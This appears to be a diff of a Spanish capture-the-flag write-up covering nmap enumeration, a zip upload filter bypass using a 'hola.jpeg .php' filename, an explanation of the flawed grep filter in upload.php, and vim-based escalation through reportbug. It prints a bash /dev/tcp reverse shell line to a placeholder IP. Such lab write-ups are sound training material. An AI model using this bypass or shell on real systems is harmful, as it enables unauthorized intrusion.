@@ -1,4 +1,4 @@
-I"~2<h2 id="enumeracion">Enumeracion</h2>
+I"]<<h2 id="enumeracion">Enumeracion</h2>
 
 <p>Iniciamos con un escaneo de nmap donde encontraremos el puerto 22(SSH) y 80(HTTP)</p>
 
@@ -36,7 +36,7 @@
 <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/choose.php           (Status: 200) [Size: 1908]
 </span></code></pre></div></div>
 
-<h2 id="explotacion-command-injection-via-filename">Explotacion (Command injection via filename)</h2>
+<h2 id="explotacion-arbitrary-file-upload">Explotacion (Arbitrary File Upload)</h2>
 
 <p>Viendo el funcionamiento de <strong>choose.php</strong>, vemos que podemos subir archivos .zip con archivos .jpeg dentro, y una vez subidos, se encuentran en el recurso <strong>/uploads</strong>. Si intentamos subir un archivo que no es jpeg, nos muestra algo como esto</p>
 
@@ -45,7 +45,7 @@
 
 <p>En este punto podriamos probar tratar de hacer bypass de algunos filtros o hacer zip symlik pero no sera necesario, despues de una busqueda, encontre una forma de hacer <strong>command injection</strong> a travez del nombre del archivo que se sube a un sitio web, como se explica en este blog: <a href="https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-filename">https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-filename</a></p>
 
-<p>Vemos que nos dice podemos ejecutar comandos si subimos un archivo con este nombre <strong>a$(whoami)z.jpeg</strong>, que viendo su funcionamiento, se trendria que hacer la expansion de comandos y mostrar el resultado de <strong>whoami</strong>, intente eso pero subiendo una webshell y no me funciono, entonces se me ocurrio que podria ser del nombre del archivo, asi que tenia que ponerlo de forma literal usando comillas simples para que no me escapara los caracteres especiales como el espacio, ademas de poner la extension <strong>.jpeg</strong>  para que lo aceptara. Asi que los pasos fueron:</p>
+<p>Vemos que nos dice podemos ejecutar comandos si subimos un archivo con este nombre <strong>a$(whoami)z.jpeg</strong>, que viendo su funcionamiento, se trendria que hacer la expansion de comandos y mostrar el resultado de <strong>whoami</strong>, intente eso pero subiendo una webshell y no me funciono, entonces se me ocurrio que podria ser el nombre del archivo, asi que tenia que ponerlo de forma literal usando comillas simples para que no me escapara los caracteres especiales como el espacio, ademas de poner la extension <strong>.jpeg</strong>  para que lo aceptara. Asi que los pasos fueron:</p>
 
 <ol>
   <li>
@@ -54,11 +54,11 @@
   <li>Renombar el archivo:
     <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">cp</span> <span class="n">shell</span><span class="p">.</span><span class="nf">php</span> <span class="s1">'hola.jpeg .php'</span>
 </code></pre></div>    </div>
-    <p>Se tiene que poner el espacio y entre comillas para que se interprete de forma literal, como se ve en la imagen en el archivo de arriba</p>
+    <p>Se tiene que poner el espacio y entre comillas para que se interprete de forma literal, como se ve en la imagen en el archivo de arriba, y cuando se procese se elimine el espacio en blanco</p>
 
     <p><img src="/assets/img/zon/1.png" alt="" /></p>
   </li>
-  <li>Y por ultimo se comprime: <strong>zip ola.zip hola.jpeg\ .php</strong></li>
+  <li>Y por ultimo se comprime: <strong>zip ola.zip ‘hola.jpeg .php’</strong></li>
 </ol>
 
 <p>Una vez que se suba, veremos nuestro archivo php, y habemos podido conseguir RCE</p>
@@ -71,6 +71,24 @@
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;ip&gt;/443 0&gt;&amp;1 &lt;<span class="nt">--</span> Usar URL encode
 </code></pre></div></div>
+
+<h4 id="por-que-funciona">¿Por que funciona?</h4>
+
+<p>Si vemos el archivo <strong>upload.php</strong> encargado de la subida del archivo,  vemos la parte en la que hace el filtrado:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$command</span> <span class="o">=</span> <span class="s2">"unzip -l "</span> <span class="mf">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">" | awk '{print $4}' | grep -v </span><span class="se">\"\\</span><span class="s2">.jpeg$\"</span> <span class="o">|</span> <span class="n">grep</span> <span class="mf">.</span> <span class="o">|</span> <span class="n">tail</span> <span class="o">-</span><span class="n">n1</span> <span class="o">|</span> <span class="n">grep</span> <span class="err">\</span><span class="s2">"</span><span class="se">\\</span><span class="s2">.</span><span class="se">\"</span><span class="s2">"</span><span class="p">;</span>
+        <span class="nb">exec</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Se usa <strong>escapeshellarg</strong> para escapar los caracteres especiales del nombre del archivo</li>
+  <li>Despues se usa <strong>awk ‘{print $4}’</strong> para imprimir la cuarta columna, la cual es el nombre del archivo</li>
+  <li>Despues usando grep para filtrar y excluir los que tienen “.jpeg”</li>
+  <li>Despues usando otro grep filtra por los archivos que contengan almenos un <strong>.</strong></li>
+  <li>Y para finalizar usa otro grep para filtrar los archivos que tienen un solo punto seguido, es decir, <strong>.</strong> y no <strong>..</strong>, por lo que si el archivo tiene esto <strong>archivo.jpeg ..php</strong>, no lo aceptaria, por tener dos puntos seguidos antes del php</li>
+</ul>
+
+<p>Basicamente funciona por que solo se esta filtrando que contenga la cadena <strong>.jpeg</strong> mas no por toda la extension del archivo, asi que solo es necesario agregar el espacio (que luego sera eliminado) y el <strong>.jpeg</strong> para hacer bypass de ese filtro, seguido de la extension <strong>.php</strong>, quedando el archivo despues de procesar como: <strong>archivo.jpeg.php</strong></p>
 
 <h2 id="www-data---freddie">www-data -&gt; freddie</h2>
 
@@ -122,7 +140,7 @@
 <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">file</span> <span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="n">reportbug</span>
 <span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="ss">reportbug: </span><span class="no">Python</span> <span class="n">script</span><span class="p">,</span> <span class="no">ASCII</span> <span class="n">text</span> <span class="n">executable</span>
 </code></pre></div></div>
-<p>La verdad ni lo vi completo, pero jugue con las funciones, y parece ser un script que enviar reportes de bugs en paquetes de debian, pero, la cuestion es que en un punto nos dice que editor queremos usar y nos da las opciones de <strong>vim</strong> y <strong>nano</strong>, si hacemos una busquedaen GFTOBins, nos dice que podemos spawnear una shell usando ese editor: <a href="https://gtfobins.github.io/gtfobins/vim/">https://gtfobins.github.io/gtfobins/vim/</a></p>
+<p>La verdad ni lo vi completo, pero jugue con las funciones, y parece ser un script que enviar reportes de bugs en paquetes de debian, pero, la cuestion es que en un punto nos dice que editor queremos usar y nos da las opciones de <strong>vim</strong> y <strong>nano</strong>, si hacemos una busqueda en GFTOBins, nos dice que podemos spawnear una shell usando ese editor: <a href="https://gtfobins.github.io/gtfobins/vim/">https://gtfobins.github.io/gtfobins/vim/</a></p>
 
 <p>Asi que los pasos a seguir son</p>
 
@@ -143,7 +161,7 @@
 
 <p><img src="/assets/img/zon/5.png" alt="" /></p>
 
-<p>Espero que esta parte la haya explicado bien</p>
+<p>(Espero que me haya explicado  bien en esta parte)</p>
 
 <p>Eso ha sido todo, gracias por leer ❤</p>
 
